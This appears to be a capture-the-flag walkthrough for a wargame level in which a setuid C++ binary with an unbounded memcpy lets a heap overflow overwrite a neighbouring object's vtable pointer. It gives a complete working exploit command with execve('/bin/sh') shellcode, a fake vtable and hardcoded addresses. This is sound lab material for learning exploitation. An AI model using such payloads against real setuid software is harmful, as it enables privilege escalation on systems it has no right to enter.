# Level9 Walkthrough

Binary is setuid `bonus0`. It is a C++ program with a class `N`:

```cpp
class N {
  char annotation[100];
  int number;
public:
  N(int n) { number = n; }
  void setAnnotation(char *s) { memcpy(annotation, s, strlen(s)); }
  virtual int operator+(N &r) { return number + r.number; }
  virtual int operator-(N &r) { return number - r.number; }
};

int main(int argc, char **argv) {
  if (argc <= 1)
    _exit(1);
  N *a = new N(5);
  N *b = new N(6);
  a->setAnnotation(argv[1]);
  return (*b + *a);
}
```

## Vulnerability

Because `N` has virtual functions, every object starts with a hidden pointer to its
vtable (the table of its virtual functions). The object layout is:

```
offset 0   : vtable pointer (4 bytes)
offset 4   : char annotation[100]
offset 104 : int number
```

`setAnnotation` copies `argv[1]` with `memcpy(annotation, s, strlen(s))` and no bound
check -> heap overflow. `a` and `b` are two consecutive heap blocks (`b` is 112 bytes
after `a`: 108-byte object + 4-byte malloc header), so overflowing `a`'s annotation
overwrites the vtable pointer at the start of `b`.

`*b + *a` calls `operator+` through `b`'s vtable pointer. The call dereferences twice:
`b -> vtable pointer -> vtable[0] -> call`. Controlling `b`'s vtable pointer gives
control of the jump target.

## Exploitation

Put shellcode in the buffer (heap is executable, NX disabled, ASLR off) and craft a
fake vtable so the call lands on it.

- `a` = `0x0804a008`, so the annotation buffer `A` = `0x0804a00c`.
- Shellcode placed at `A + 4` = `0x0804a010`.
- `b`'s vtable pointer sits at buffer offset 108 (`b = a + 112`).

Buffer layout:

```
[ A+4 = shellcode address ] [ shellcode ] [ padding ] [ A = fake vtable at buffer start ]
```

At runtime: `b`'s vtable pointer = `A`, so `vtable[0]` is read from `A` = `0x0804a010`,
and `call` jumps to the shellcode.

```sh
./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A"*(108-4-21) + "\x0c\xa0\x04\x08"')
```

- `\x10\xa0\x04\x08`: shellcode address (`0x0804a010`), the value the fake vtable returns.
- shellcode: `execve("/bin/sh")`, 21 bytes.
- `"A"*(108-4-21)`: padding to reach `b`'s vtable pointer (offset 108, minus the 4-byte
  address and the 21-byte shellcode).
- `\x0c\xa0\x04\x08`: new vtable pointer for `b` = buffer start (`0x0804a00c`).

